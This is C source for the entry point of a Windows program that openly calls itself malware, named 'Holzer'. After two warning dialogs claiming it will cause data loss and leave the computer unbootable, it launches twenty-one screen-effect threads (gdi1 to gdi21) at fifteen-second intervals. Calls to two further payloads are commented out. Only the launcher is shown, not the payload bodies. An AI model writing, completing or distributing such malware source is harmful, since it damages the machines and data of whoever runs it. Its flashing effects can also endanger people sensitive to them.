#include "holzer.h"

INT WINAPI wWinMain(_In_ HINSTANCE hInstance, _In_opt_ HINSTANCE hPrevInstance, _In_ PWSTR pszCmdLine, _In_ INT nShowCmd)
{
	UNREFERENCED_PARAMETER(hInstance);
	UNREFERENCED_PARAMETER(hPrevInstance);
	UNREFERENCED_PARAMETER(pszCmdLine);
	UNREFERENCED_PARAMETER(nShowCmd);

	SetProcessDPIAware();

	if (MessageBoxW(NULL, L"You are about to run a malware.\n\nUse this malware wisely, this will cause d ata loss and makes your computer likely unbootable.\nIf you don\'t know what i s this program do, just click \'No\' to keep your computer safe.\nWhen clickin g \'Yes\', the malware will start and you\'ll understand the risk. If you want  to\ntry this, then use a secure environment, like a Virtual Machine.\nThe cre ator is not responsible for any data loss or damage made to your computer.\nEx ecute this malware? You won\'t be able to use Windows again!\n\nWARNING: This  malware contain flashing lights and disturbing noises.", L"Holzer", MB_ICONWARNING | MB_YESNO) != IDYES)
		return false;

	if (MessageBoxW(NULL, L"FINAL WARNING!\n\nIf you have read the previous warning, then you\'ll keep  in mind that your\ncomputer going to be destroyed. Clicking \'Yes\' destroys  your computer!\nYou won\'t be able to use Windows again!\nThe creator is no t responsible for any data loss or damage made to your computer.\n\nDo you s till wanna execute this malware?", L"Holzer", MB_ICONWARNING | MB_YESNO) != IDYES)
		return false;

	HolzerMain(0);
}

	DWORD WINAPI HolzerMain(LPVOID lpParam)	
	{
		//payload2();

		//CreateThread(0, 0, payload3, 0, 0, 0);

		CreateThread(0, 0, gdi1, 0, 0, 0);

		Sleep((DWORD)15000);

		CreateThread(0, 0, gdi2, 0, 0, 0);

		Sleep((DWORD)15000);

		CreateThread(0, 0, gdi3, 0, 0, 0);

		Sleep((DWORD)15000);

		CreateThread(0, 0, gdi4, 0, 0, 0);

		Sleep((DWORD)15000);

		CreateThread(0, 0, gdi5, 0, 0, 0);

		Sleep((DWORD)15000);

		CreateThread(0, 0, gdi6, 0, 0, 0);

		Sleep((DWORD)15000);

		CreateThread(0, 0, gdi7, 0, 0, 0);

		Sleep((DWORD)15000);

		CreateThread(0, 0, gdi8, 0, 0, 0);

		Sleep((DWORD)15000);

		CreateThread(0, 0, gdi9, 0, 0, 0);

		Sleep((DWORD)15000);

		CreateThread(0, 0, gdi10, 0, 0, 0);

		Sleep((DWORD)15000);

		CreateThread(0, 0, gdi11, 0, 0, 0);

		Sleep((DWORD)15000);

		CreateThread(0, 0, gdi12, 0, 0, 0);

		Sleep((DWORD)15000);

		CreateThread(0, 0, gdi13, 0, 0, 0);

		Sleep((DWORD)15000);

		CreateThread(0, 0, gdi14, 0, 0, 0);

		Sleep((DWORD)15000);

		CreateThread(0, 0, gdi15, 0, 0, 0);

		Sleep((DWORD)15000);

		CreateThread(0, 0, gdi16, 0, 0, 0);

		Sleep((DWORD)15000);

		CreateThread(0, 0, gdi17, 0, 0, 0);

		Sleep((DWORD)15000);

		CreateThread(0, 0, gdi18, 0, 0, 0);

		Sleep((DWORD)15000);

		CreateThread(0, 0, gdi19, 0, 0, 0);

		Sleep((DWORD)15000);

		CreateThread(0, 0, gdi20, 0, 0, 0);

		Sleep((DWORD)15000);

		CreateThread(0, 0, gdi21, 0, 0, 0);

		Sleep((DWORD)15000);

		return 0;
	}
